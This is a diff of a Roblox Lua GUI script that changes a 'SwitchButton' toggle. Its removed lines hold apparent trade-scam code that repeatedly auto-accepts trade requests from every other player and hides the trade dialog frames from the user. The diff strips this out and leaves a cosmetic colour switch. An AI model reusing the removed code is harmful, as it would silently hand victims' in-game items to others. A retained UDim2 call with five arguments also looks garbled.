@@ -448,63 +448,17 @@ coroutine.wrap(LYTAYH_fake_script)()
 local function DBQCXK_fake_script() -- SwitchButton.SwitchScript 
 	local script = Instance.new('LocalScript', SwitchButton)
 
-	local ReplicatedStorage = game:GetService("ReplicatedStorage")
-	local Players = game:GetService("Players")
 	local button = script.Parent
 	local circle = button:WaitForChild("Circle")
-	local main = button:FindFirstAncestor("Main")
-	local tradeFunction = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
 	
-	local enabled = false
-	main:SetAttribute("AutoAcceptEnabled", false)
+	local green = false
 	
 	circle.BackgroundColor3 = Color3.fromRGB(132, 0, 132)
-
-	local function acceptTradeForAll()
-		for _, targetPlayer in ipairs(Players:GetPlayers()) do
-			if targetPlayer ~= Players.LocalPlayer then
-				pcall(function()
-					tradeFunction:InvokeServer(targetPlayer, true)
-				end)
-			end
-		end
-	end
-
-	local frameNames = {"Dialog", "Frametest2", "Frametest3"}
-	local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
-
-	local function updateHiddenFrames()
-		for _, frameName in ipairs(frameNames) do
-			local frame = playerGui:FindFirstChild(frameName, true)
-			if frame and frame:IsA("GuiObject") then
-				if enabled then
-					if frame:GetAttribute("AutoAcceptOriginalVisible") == nil then
-						frame:SetAttribute("AutoAcceptOriginalVisible", frame.Visible)
-					end
-					frame.Visible = false
-				elseif frame:GetAttribute("AutoAcceptOriginalVisible") ~= nil then
-					frame.Visible = frame:GetAttribute("AutoAcceptOriginalVisible")
-					frame:SetAttribute("AutoAcceptOriginalVisible", nil)
-				end
-			end
-		end
-	end
-
-	task.spawn(function()
-		while button.Parent do
-			if enabled then
-				acceptTradeForAll()
-			end
-			updateHiddenFrames()
-			task.wait(1)
-		end
-	end)
 	
 	button.Activated:Connect(function()
-		enabled = not enabled
-		main:SetAttribute("AutoAcceptEnabled", enabled)
+		green = not green
 	
-		if enabled then
+		if green then
 			circle.Position = UDim2.new(0.47, 0, 0,0.012, 0)
 			circle.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
 		else
